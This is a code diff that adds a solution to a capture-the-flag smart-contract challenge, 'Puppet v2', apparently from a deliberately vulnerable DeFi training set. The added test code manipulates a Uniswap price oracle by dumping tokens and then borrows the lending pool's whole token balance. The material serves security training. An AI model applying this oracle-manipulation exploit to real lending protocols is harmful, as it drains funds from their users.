@@ -83,6 +83,22 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // dump all player's DVT tokens (oracle manipulation)
+        const deadline = (await ethers.provider.getBlock('latest')).timestamp * 2;
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await uniswapRouter.connect(player).swapExactTokensForTokens(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            1,
+            [token.address, weth.address],
+            player.address,
+            deadline);
+
+        // borrow
+        const depositAmount = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        const wethToDeposit = depositAmount - (await weth.balanceOf(player.address));
+        await weth.connect(player).deposit({value: BigInt(wethToDeposit)});
+        await weth.connect(player).approve(lendingPool.address, await weth.balanceOf(player.address));
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
